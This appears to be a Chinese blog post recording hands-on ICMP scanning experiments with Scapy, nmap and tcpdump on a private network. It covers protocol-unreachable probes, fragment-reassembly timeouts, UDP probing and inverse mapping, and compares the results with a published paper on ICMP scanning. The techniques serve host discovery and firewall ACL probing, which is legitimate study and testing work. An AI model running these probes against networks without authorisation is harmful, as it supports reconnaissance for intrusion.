<span class="tag">traceroute</span> <span class="tag">to</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> (10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span>), 30 <span class="tag">hops</span> <span class="tag">max</span>, 60 <span class="tag">byte</span> <span class="tag">packets</span>
 1  10<span class="class">.210</span><span class="class">.96</span><span class="class">.193</span> (10<span class="class">.210</span><span class="class">.96</span><span class="class">.193</span>)  2<span class="class">.537</span> <span class="tag">ms</span>  2<span class="class">.798</span> <span class="tag">ms</span>  3<span class="class">.158</span> <span class="tag">ms</span>
 2  10<span class="class">.1</span><span class="class">.10</span><span class="class">.1</span> (10<span class="class">.2</span><span class="class">.100</span><span class="class">.1</span>)  1<span class="class">.260</span> <span class="tag">ms</span>  1<span class="class">.423</span> <span class="tag">ms</span>  1<span class="class">.425</span> <span class="tag">ms</span>
 3  10<span class="class">.1</span><span class="class">.2</span><span class="class">.1</span> (10<span class="class">.2</span><span class="class">.1</span><span class="class">.1</span>)  0<span class="class">.824</span> <span class="tag">ms</span>  1<span class="class">.197</span> <span class="tag">ms</span>  1<span class="class">.614</span> <span class="tag">ms</span>
 4  10<span class="class">.0</span><span class="class">.10</span><span class="class">.1</span> (10<span class="class">.0</span><span class="class">.10</span><span class="class">.1</span>)  0<span class="class">.504</span> <span class="tag">ms</span>  0<span class="class">.534</span> <span class="tag">ms</span>  0<span class="class">.542</span> <span class="tag">ms</span>
 5  10<span class="class">.0</span><span class="class">.13</span><span class="class">.2</span> (10<span class="class">.0</span><span class="class">.13</span><span class="class">.2</span>)  4<span class="class">.714</span> <span class="tag">ms</span>  4<span class="class">.895</span> <span class="tag">ms</span>  5<span class="class">.053</span> <span class="tag">ms</span>
 6  10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> (10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span>)  0<span class="class">.477</span> <span class="tag">ms</span>  0<span class="class">.428</span> <span class="tag">ms</span>  0<span class="class">.414</span> <span class="tag">ms</span>
</code></pre><p>在wireshark中可以看的更清楚：</p>
<pre><code>Extended Security (<span class="operator">with</span> option <span class="built_in">length</span> = <span class="number">2</span> <span class="keyword">bytes</span>; should be &gt;= <span class="number">3</span>)
</code></pre><p>我们发了一个奇怪的包= =</p>
<p><a href="http://althing.cs.dartmouth.edu/local/ICMP_Scanning_v3.0.pdf" target="_blank" rel="external">ICMP Usage in Scanning</a>中详述了使用这些技术探测ACL(访问控制列表)的神奇应用。</p>
<p>接着我们试试奇葩的protocol字段：</p>
<pre><code>&gt;&gt;&gt; ip.proto=<span class="number">155</span>
&gt;&gt;&gt; ip.show()
<span class="preprocessor">###[ IP ]###</span>
  version= <span class="number">4</span>
  ihl= None
  tos= <span class="number">0x0</span>
  len= None
  id= <span class="number">1</span>
  flags= 
  frag= <span class="number">0</span>
  ttl= <span class="number">64</span>
  proto= <span class="number">155</span>
  chksum= None
  src= <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span>
  dst= <span class="number">10.3</span><span class="number">.18</span><span class="number">.231</span>
  \options\
<span class="preprocessor">###[ UDP ]###</span>
     sport= domain
     dport= domain
     len= None
     chksum= None
&gt;&gt;&gt; send(ip)
.
Sent <span class="number">1</span> packets.
</code></pre><p>产生了一个destination unreachable(protocol unreachable)的错误报文。</p>
<pre><code> ~ ⮀ <span class="tag">sudo</span> <span class="tag">tcpdump</span> <span class="tag">-i</span> <span class="tag">eth0</span> "<span class="tag">icmp</span>"
<span class="tag">tcpdump</span>: <span class="tag">verbose</span> <span class="tag">output</span> <span class="tag">suppressed</span>, <span class="tag">use</span> <span class="tag">-v</span> <span class="tag">or</span> <span class="tag">-vv</span> <span class="tag">for</span> <span class="tag">full</span> <span class="tag">protocol</span> <span class="tag">decode</span>
<span class="tag">listening</span> <span class="tag">on</span> <span class="tag">eth0</span>, <span class="tag">link-type</span> <span class="tag">EN10MB</span> (<span class="tag">Ethernet</span>), <span class="tag">capture</span> <span class="tag">size</span> 65535 <span class="tag">bytes</span>
15<span class="pseudo">:43</span><span class="pseudo">:14</span><span class="class">.737608</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.231</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.231</span> <span class="tag">protocol</span> 155 <span class="tag">unreachable</span>, <span class="tag">length</span> 36
</code></pre><p>该技术可用于主机发现，用nmap也可以结合各种协议来进行ACL的探测。</p>
<pre><code>sudo nmap -sO <span class="number">10.3</span><span class="number">.18</span><span class="number">.66</span>
</code></pre><p>这是部分抓到的包：</p>
<pre><code> ~ ⮀ <span class="tag">sudo</span> <span class="tag">tcpdump</span> "<span class="tag">icmp</span>"
<span class="tag">tcpdump</span>: <span class="tag">verbose</span> <span class="tag">output</span> <span class="tag">suppressed</span>, <span class="tag">use</span> <span class="tag">-v</span> <span class="tag">or</span> <span class="tag">-vv</span> <span class="tag">for</span> <span class="tag">full</span> <span class="tag">protocol</span> <span class="tag">decode</span>
<span class="tag">listening</span> <span class="tag">on</span> <span class="tag">eth0</span>, <span class="tag">link-type</span> <span class="tag">EN10MB</span> (<span class="tag">Ethernet</span>), <span class="tag">capture</span> <span class="tag">size</span> 65535 <span class="tag">bytes</span>
15<span class="pseudo">:51</span><span class="pseudo">:15</span><span class="class">.618473</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 15 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:16</span><span class="class">.719654</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 241 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:17</span><span class="class">.820941</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 176 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:18</span><span class="class">.922155</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 126 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:19</span><span class="class">.427885</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 184 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:20</span><span class="class">.434376</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 45 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:21</span><span class="class">.455654</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 59 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:22</span><span class="class">.466907</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 37 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:23</span><span class="class">.478382</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 233 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:24</span><span class="class">.492506</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 162 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:25</span><span class="class">.531125</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 72 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:26</span><span class="class">.452325</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 255 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:27</span><span class="class">.473618</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 58 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:28</span><span class="class">.415352</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 25 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:29</span><span class="class">.435785</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 169 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:30</span><span class="class">.456992</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 206 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:31</span><span class="class">.478499</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 28 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:31</span><span class="class">.527789</span> <span class="tag">IP</span> 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span> &gt; 10<span class="class">.3</span><span class="class">.9</span><span class="class">.4</span>: <span class="tag">ICMP</span> 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span> <span class="tag">udp</span> <span class="tag">port</span> 48089 <span class="tag">unreachable</span>, <span class="tag">length</span> 72
15<span class="pseudo">:51</span><span class="pseudo">:31</span><span class="class">.527806</span> <span class="tag">IP</span> 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span> &gt; 10<span class="class">.3</span><span class="class">.9</span><span class="class">.4</span>: <span class="tag">ICMP</span> 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span> <span class="tag">udp</span> <span class="tag">port</span> 55862 <span class="tag">unreachable</span>, <span class="tag">length</span> 72
</code></pre><h2 id="ICMP_Ip_Reassembly_Time_Exceeded">ICMP Ip Reassembly Time Exceeded</h2><p>我们可以故意把发送不完整的IP分片。来探测主机，当对一个网络实行这个伎俩时，就可以探测整个网络拓扑。</p>
<pre><code><span class="prompt">&gt;&gt;</span>&gt; ip = <span class="constant">IP</span>()/<span class="constant">TCP</span>()/<span class="string">"abcdefg"</span>
<span class="prompt">&gt;&gt;</span>&gt; ip.flags=<span class="number">1</span>
<span class="prompt">&gt;&gt;</span>&gt; ip.dst=<span class="string">'10.3.18.66'</span>
<span class="prompt">&gt;&gt;</span>&gt; ip.show()
<span class="comment">###[ IP ]###</span>
  version= <span class="number">4</span>
  ihl= <span class="constant">None</span>
  tos= <span class="number">0x0</span>
  len= <span class="constant">None</span>
  id= <span class="number">1</span>
  flags= <span class="constant">MF</span>
  frag= <span class="number">0</span>
  ttl= <span class="number">64</span>
  proto= tcp
  chksum= <span class="constant">None</span>
  src= <span class="number">10.210</span>.<span class="number">96.200</span>
  dst= <span class="number">10.3</span>.<span class="number">18.66</span>
  \options\
<span class="comment">###[ TCP ]###</span>
     sport= ftp_data
     dport= http
     seq= <span class="number">0</span>
     ack= <span class="number">0</span>
     dataofs= <span class="constant">None</span>
     reserved= <span class="number">0</span>
     flags= <span class="constant">S</span>
     window= <span class="number">8192</span>
     chksum= <span class="constant">None</span>
     urgptr= <span class="number">0</span>
     options= {}
<span class="comment">###[ Raw ]###</span>
        load= <span class="string">'abcdefg'</span>
<span class="prompt">&gt;&gt;</span>&gt; send(ip)
.
<span class="constant">Sent</span> <span class="number">1</span> packets.
</code></pre><p>过了好久好久，返回一个重组分片超时IMCP错误</p>
<pre><code>~ ⮀ sudo tcpdump -i eth0 "icmp"
tcpdump: verbose output suppressed, <span class="operator"><span class="keyword">use</span> -v <span class="keyword">or</span> -vv <span class="keyword">for</span> <span class="keyword">full</span> protocol <span class="keyword">decode</span>
listening <span class="keyword">on</span> eth0, <span class="keyword">link</span>-<span class="keyword">type</span> EN10MB (Ethernet), capture <span class="keyword">size</span> <span class="number">65535</span> <span class="keyword">bytes</span>
<span class="number">16</span>:<span class="number">29</span>:<span class="number">22.186723</span> IP <span class="number">10.3</span><span class="number">.18</span><span class="number">.66</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span>: ICMP ip reassembly <span class="keyword">time</span> exceeded, <span class="keyword">length</span> <span class="number">52</span></span>
</code></pre><p>不是所有主机都会对这个响应。我试了试局域网内有的设备就没反应= =。</p>
<p>但这个端口不需要打开，试试81端口(确认此台机器没有打开81端口)也是直接返回ICMP超时错误。操作系统会直接处理报文并返回错误消息。</p>
<p>我又试了试UDP：</p>
<p>不管你是不是扫描打开的端口，都返回同样的超时错误：</p>
<pre><code><span class="prompt">&gt;&gt;</span>&gt; ip[<span class="number">1</span>]=<span class="constant">UDP</span>()
<span class="prompt">&gt;&gt;</span>&gt; ip.show()
<span class="comment">###[ IP ]###</span>
  version= <span class="number">4</span>
  ihl= <span class="constant">None</span>
  tos= <span class="number">0x0</span>
  len= <span class="constant">None</span>
  id= <span class="number">1</span>
  flags= <span class="constant">MF</span>
  frag= <span class="number">0</span>
  ttl= <span class="number">64</span>
  proto= udp
  chksum= <span class="constant">None</span>
  src= <span class="number">10.210</span>.<span class="number">96.200</span>
  dst= <span class="number">10.210</span>.<span class="number">96.195</span>
  \options\
<span class="comment">###[ UDP ]###</span>
     sport= domain
     dport= domain
     len= <span class="constant">None</span>
     chksum= <span class="constant">None</span>
<span class="prompt">&gt;&gt;</span>&gt; ip[<span class="number">1</span>].dport=<span class="number">80</span>
<span class="prompt">&gt;&gt;</span>&gt; ip.dst
<span class="string">'10.210.96.195'</span>
<span class="prompt">&gt;&gt;</span>&gt; ip.dst=<span class="string">'10.3.18.66'</span>
<span class="prompt">&gt;&gt;</span>&gt; send(ip)
.
<span class="constant">Sent</span> <span class="number">1</span> packets.
<span class="prompt">&gt;&gt;</span>&gt; ip[<span class="number">1</span>].dport=<span class="number">81</span>
<span class="prompt">&gt;&gt;</span>&gt; send(ip)
.
<span class="constant">Sent</span> <span class="number">1</span> packets.

 ~ ⮀ sudo tcpdump -i eth<span class="number">0</span> <span class="string">"host 10.3.18.66"</span>   
<span class="symbol">tcpdump:</span> verbose output suppressed, use -v <span class="keyword">or</span> -vv <span class="keyword">for</span> full protocol decode
listening on eth<span class="number">0</span>, link-type <span class="constant">EN10MB</span> (<span class="constant">Ethernet</span>), capture size <span class="number">65535</span> bytes
<span class="number">16</span><span class="symbol">:</span><span class="number">46</span><span class="symbol">:</span><span class="number">46.455970</span> <span class="constant">IP</span> <span class="number">10.210</span>.<span class="number">96.200</span>.domain &gt; <span class="number">10.3</span>.<span class="number">18.66</span>.<span class="symbol">http:</span> [|domain]
<span class="number">16</span><span class="symbol">:</span><span class="number">47</span><span class="symbol">:</span><span class="number">16.455677</span> <span class="constant">IP</span> <span class="number">10.3</span>.<span class="number">18.66</span> &gt; <span class="number">10.210</span>.<span class="number">96.200</span><span class="symbol">:</span> <span class="constant">ICMP</span> ip reassembly time exceeded, length <span class="number">36</span>
<span class="number">16</span><span class="symbol">:</span><span class="number">47</span><span class="symbol">:</span><span class="number">29.237026</span> <span class="constant">IP</span> <span class="number">10.210</span>.<span class="number">96.200</span>.domain &gt; <span class="number">10.3</span>.<span class="number">18.66</span>.hosts2-<span class="symbol">ns:</span> [|domain]
<span class="number">16</span><span class="symbol">:</span><span class="number">47</span><span class="symbol">:</span><span class="number">59.236648</span> <span class="constant">IP</span> <span class="number">10.3</span>.<span class="number">18.66</span> &gt; <span class="number">10.210</span>.<span class="number">96.200</span><span class="symbol">:</span> <span class="constant">ICMP</span> ip reassembly time exceeded, length <span class="number">36</span>
</code></pre><p>这和前文提到的<a href="http://althing.cs.dartmouth.edu/local/ICMP_Scanning_v3.0.pdf" target="_blank" rel="external">ICMP Usage in Scanning</a>所说的不一样！！！！！</p>
<p>我懒得再试其它机器和封装个ICMP包的例子了。</p>
<p>好吧，还是试了试，一个没反应。一个对开放端口(22)和非开放端口(23)都返回同样值。</p>
<pre><code>&gt;&gt;&gt; ip.dst=<span class="string">'10.210.96.210'</span>
&gt;&gt;&gt; <span class="function"><span class="title">send</span><span class="params">(ip)</span></span>
.
Sent <span class="number">1</span> packets.
&gt;&gt;&gt; ip.dst=<span class="string">'10.210.96.195'</span>
&gt;&gt;&gt; ip[<span class="number">1</span>].dport=<span class="number">22</span>
&gt;&gt;&gt; <span class="function"><span class="title">send</span><span class="params">(ip)</span></span>
.
Sent <span class="number">1</span> packets.
&gt;&gt;&gt; ip[<span class="number">1</span>].dport=<span class="number">23</span>
&gt;&gt;&gt; <span class="function"><span class="title">send</span><span class="params">(ip)</span></span>
.
Sent <span class="number">1</span> packets.

<span class="number">16</span>:<span class="number">58</span>:<span class="number">25.736005</span> IP <span class="number">10.210</span>.<span class="number">96.200</span><span class="class">.ftp-data</span> &gt; <span class="number">10.210</span>.<span class="number">96.195</span><span class="class">.ssh</span>: Flags [S], seq <span class="number">0</span>, win <span class="number">8192</span>, length <span class="number">0</span>
<span class="number">16</span>:<span class="number">58</span>:<span class="number">55.765861</span> IP <span class="number">10.210</span>.<span class="number">96.195</span> &gt; <span class="number">10.210</span>.<span class="number">96.200</span>: ICMP ip reassembly <span class="tag">time</span> exceeded, length <span class="number">44</span>
<span class="number">16</span>:<span class="number">59</span>:<span class="number">15.097094</span> IP <span class="number">10.210</span>.<span class="number">96.200</span><span class="class">.ftp-data</span> &gt; <span class="number">10.210</span>.<span class="number">96.195</span><span class="class">.telnet</span>: Flags [S], seq <span class="number">0</span>, win <span class="number">8192</span>, length <span class="number">0</span>
<span class="number">16</span>:<span class="number">59</span>:<span class="number">45.171689</span> IP <span class="number">10.210</span>.<span class="number">96.195</span> &gt; <span class="number">10.210</span>.<span class="number">96.200</span>: ICMP ip reassembly <span class="tag">time</span> exceeded, length <span class="number">44</span>
</code></pre><p>和文档描述的不相同，但只要有ICMP报文返回，说明主机是打开的。(好像没什么用…)</p>
<h2 id="UDP扫描">UDP扫描</h2><p>结合各种协议和端口，探测内网拓扑。</p>
<p>比如，我们可以先用nmap ping 扫射下某网段，然后分别试着尝试协议端口。</p>
<pre><code><span class="prompt">&gt;&gt;&gt; </span>ip[<span class="number">1</span>]=UDP()
<span class="prompt">&gt;&gt;&gt; </span>ip.show()
<span class="comment">###[ IP ]###</span>
  version= <span class="number">4</span>
  ihl= <span class="keyword">None</span>
  tos= <span class="number">0x0</span>
  len= <span class="keyword">None</span>
  id= <span class="number">1</span>
  flags= 
  frag= <span class="number">0</span>
  ttl= <span class="number">64</span>
  proto= udp
  chksum= <span class="keyword">None</span>
  src= <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span>
  dst= <span class="number">10.3</span><span class="number">.18</span><span class="number">.66</span>
  \options\
<span class="comment">###[ UDP ]###</span>
     sport= domain
     dport= domain
     len= <span class="keyword">None</span>
     chksum= <span class="keyword">None</span>
<span class="prompt">&gt;&gt;&gt; </span>send(ip)
.
Sent <span class="number">1</span> packets.

 ~ ⮀ sudo nmap -sP <span class="number">10.3</span><span class="number">.18</span><span class="number">.66</span>/<span class="number">24</span> 
Nmap scan report <span class="keyword">for</span> <span class="number">10.3</span><span class="number">.18</span><span class="number">.213</span>
Host <span class="keyword">is</span> up (<span class="number">0.00052</span>s latency).
Nmap scan report <span class="keyword">for</span> <span class="number">10.3</span><span class="number">.18</span><span class="number">.231</span>
Host <span class="keyword">is</span> up (<span class="number">0.00052</span>s latency).
Nmap scan report <span class="keyword">for</span> <span class="number">10.3</span><span class="number">.18</span><span class="number">.232</span>
Host <span class="keyword">is</span> up (<span class="number">0.00038</span>s latency).

<span class="prompt">&gt;&gt;&gt; </span>ip.dst=<span class="string">'10.3.18.230'</span>
<span class="prompt">&gt;&gt;&gt; </span>send(ip)
.
Sent <span class="number">1</span> packets.
<span class="prompt">&gt;&gt;&gt; </span>ip.dst=<span class="string">'10.3.18.231'</span>
<span class="prompt">&gt;&gt;&gt; </span>send(ip)
.
Sent <span class="number">1</span> packets.
</code></pre><p>只有<code>10.3.18.231</code>这个活着的机器有返回destination unreachable(Port unreachable)报文。</p>
<pre><code> ~ ⮀ <span class="tag">sudo</span> <span class="tag">tcpdump</span> <span class="tag">-i</span> <span class="tag">eth0</span> "<span class="tag">icmp</span>"
<span class="tag">tcpdump</span>: <span class="tag">verbose</span> <span class="tag">output</span> <span class="tag">suppressed</span>, <span class="tag">use</span> <span class="tag">-v</span> <span class="tag">or</span> <span class="tag">-vv</span> <span class="tag">for</span> <span class="tag">full</span> <span class="tag">protocol</span> <span class="tag">decode</span>
<span class="tag">listening</span> <span class="tag">on</span> <span class="tag">eth0</span>, <span class="tag">link-type</span> <span class="tag">EN10MB</span> (<span class="tag">Ethernet</span>), <span class="tag">capture</span> <span class="tag">size</span> 65535 <span class="tag">bytes</span>
15<span class="pseudo">:39</span><span class="pseudo">:12</span><span class="class">.697553</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.231</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.231</span> <span class="tag">udp</span> <span class="tag">port</span> <span class="tag">domain</span> <span class="tag">unreachable</span>, <span class="tag">length</span> 36
</code></pre><h2 id="分片与MTU">分片与MTU</h2><p>我的意思是，恰巧目标网络的MTU比上一跳网络的MTU小，如果我们设置DF标志为1,同时让IP数据包的值介于两者之间，然后倒霉的内网路由器就会发回Fragmentation Needed ICMP报文。</p>
<p>该死的我没找到比我更小的MTU网段了。现在无线网没人用了？</p>
<h2 id="Inverse_Mapping">Inverse Mapping</h2><p>大多数防火墙不过滤ICMP reply。</p>
<p>假设我们的ip是<code>10.210.96.200</code>，<code>10.210.97.195</code>是存在的。而<code>10.210.97.196</code>不在线。</p>
<pre><code><span class="prompt">&gt;&gt;</span>&gt; icmp = <span class="constant">IP</span>()/<span class="constant">ICMP</span>()
<span class="prompt">&gt;&gt;</span>&gt; icmp.dst=<span class="string">'10.210.97.195'</span>
<span class="prompt">&gt;&gt;</span>&gt; icmp.show()
<span class="comment">###[ IP ]###</span>
  version= <span class="number">4</span>
  ihl= <span class="constant">None</span>
  tos= <span class="number">0x0</span>
  len= <span class="constant">None</span>
  id= <span class="number">1</span>
  flags= 
  frag= <span class="number">0</span>
  ttl= <span class="number">64</span>
  proto= icmp
  chksum= <span class="constant">None</span>
  src= <span class="number">10.210</span>.<span class="number">96.200</span>
  dst= <span class="number">10.210</span>.<span class="number">97.195</span>
  \options\
<span class="comment">###[ ICMP ]###</span>
     type= echo-reply
     code= <span class="number">0</span>
     chksum= <span class="constant">None</span>
     id= <span class="number">0x0</span>
     seq= <span class="number">0x0</span>
<span class="prompt">&gt;&gt;</span>&gt; send(icmp)
.
<span class="constant">Sent</span> <span class="number">1</span> packets.

 ~ ⮀ sudo tcpdump -i eth<span class="number">0</span> <span class="string">"host 10.210.97.195"</span>
<span class="symbol">tcpdump:</span> verbose output suppressed, use -v <span class="keyword">or</span> -vv <span class="keyword">for</span> full protocol decode
listening on eth<span class="number">0</span>, link-type <span class="constant">EN10MB</span> (<span class="constant">Ethernet</span>), capture size <span class="number">65535</span> bytes
<span class="number">22</span><span class="symbol">:</span><span class="number">51</span><span class="symbol">:</span><span class="number">47.187719</span> <span class="constant">IP</span> <span class="number">10.210</span>.<span class="number">96.200</span> &gt; <span class="number">10.210</span>.<span class="number">97.195</span><span class="symbol">:</span> <span class="constant">ICMP</span> echo reply, id <span class="number">0</span>, seq <span class="number">0</span>, length <span class="number">8</span>
<span class="number">22</span><span class="symbol">:</span><span class="number">51</span><span class="symbol">:</span><span class="number">47.188369</span> <span class="constant">IP</span> <span class="number">10.210</span>.<span class="number">97.195</span> &gt; <span class="number">10.210</span>.<span class="number">96.200</span><span class="symbol">:</span> <span class="constant">ICMP</span> <span class="number">10.210</span>.<span class="number">97.195</span> protocol <span class="number">1</span> unreachable, length <span class="number">36</span>
</code></pre><p>发现<code>10.210.97.195</code>竟然尼码响应了！！！！！！协议不可到达！！</p>
<p>不存在的ip地址则没有响应！这尼码完全和上文提到的<a href="http://althing.cs.dartmouth.edu/local/ICMP_Scanning_v3.0.pdf" target="_blank" rel="external">ICMP Usage in Scanning</a>说的相反好么！！！</p>
<pre><code><span class="prompt">&gt;&gt;</span>&gt; icmp.dst=<span class="string">'10.210.97.196'</span>
<span class="prompt">&gt;&gt;</span>&gt; send(icmp)
.
<span class="constant">Sent</span> <span class="number">1</span> packets.

~ ⮀ sudo tcpdump -i eth<span class="number">0</span> <span class="string">"host 10.210.97.196"</span>
<span class="symbol">tcpdump:</span> verbose output suppressed, use -v <span class="keyword">or</span> -vv <span class="keyword">for</span> full protocol decode
listening on eth<span class="number">0</span>, link-type <span class="constant">EN10MB</span> (<span class="constant">Ethernet</span>), capture size <span class="number">65535</span> bytes
<span class="number">22</span><span class="symbol">:</span><span class="number">56</span><span class="symbol">:</span><span class="number">15.725836</span> <span class="constant">IP</span> <span class="number">10.210</span>.<span class="number">96.200</span> &gt; <span class="number">10.210</span>.<span class="number">97.196</span><span class="symbol">:</span> <span class="constant">ICMP</span> echo reply, id <span class="number">0</span>, seq <span class="number">0</span>, length <span class="number">8</span>
</code></pre><p>不过后来找到个在线的<code>10.210.97.200</code>也不响应。</p>
<pre><code>&gt;&gt;&gt; icmp.dst=<span class="string">'10.210.97.200'</span>
&gt;&gt;&gt; <span class="built_in">send</span>(icmp)
.
Sent <span class="number">1</span> packets.

 ~ ⮀ sudo tcpdump -i eth0 <span class="string">"host 10.210.97.200"</span>
tcpdump: verbose output suppressed, use -v <span class="operator">or</span> -vv <span class="keyword">for</span> full protocol decode
listening <span class="command"><span class="keyword">on</span> <span class="title">eth0</span>, <span class="title">link-type</span> <span class="title">EN10MB</span> (<span class="title">Ethernet</span>), <span class="title">capture</span> <span class="title">size</span> <span class="title">65535</span> <span class="title">bytes</span></span>
